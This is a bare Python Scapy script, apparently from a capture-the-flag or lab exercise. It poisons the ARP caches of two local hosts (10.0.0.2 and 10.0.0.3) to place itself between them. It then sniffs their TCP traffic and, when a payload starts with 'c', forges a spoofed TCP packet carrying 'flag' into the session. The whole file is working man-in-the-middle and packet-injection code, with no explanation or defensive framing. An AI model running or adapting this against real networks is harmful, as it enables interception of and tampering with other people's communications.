from scapy.all import *

sendp(Ether(src=get_if_hwaddr("eth0"), dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", psrc="10.0.0.2", pdst="10.0.0.3"),count=2)
sendp(Ether(src=get_if_hwaddr("eth0"), dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", psrc="10.0.0.3", pdst="10.0.0.2"),count=2)

def inject(pkt):
    # Print packets
        print("--- PKT: ---")
        print(f"src: {pkt[IP].src},   dst: {pkt[IP].dst}")
        print(f"sport: {pkt[TCP].sport},   dport: {pkt[TCP].dport}")
        print(f"seq: {pkt.seq},   ack: {pkt.ack}")
        print(f"flags: {pkt[TCP].flags}")
        
        if(Raw in pkt):
            print(f"load: {pkt[Raw].load}")    
            print(f"len payload: {len(pkt[Raw].load)}")                                                                     #pkt[TCP].dport pkt[IP].dst
            if(pkt[Raw].load[0] == ord("c")):
                sendp(Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) / IP(src=pkt[IP].dst, dst=pkt[IP].src) / TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, seq=pkt.ack, ack=(pkt.seq +9), flags="PA") / Raw(load="flag"))
                #sendp(Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) / IP(src=pkt[IP].dst, dst=pkt[IP].src) / TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, seq=pkt.ack, ack=(pkt.seq + len(pkt[Raw].payload)), flags="PA") / Raw(load="flag"))
        print(f"time: {pkt.time}\n")

sniff(filter="tcp", iface="eth0", prn=inject)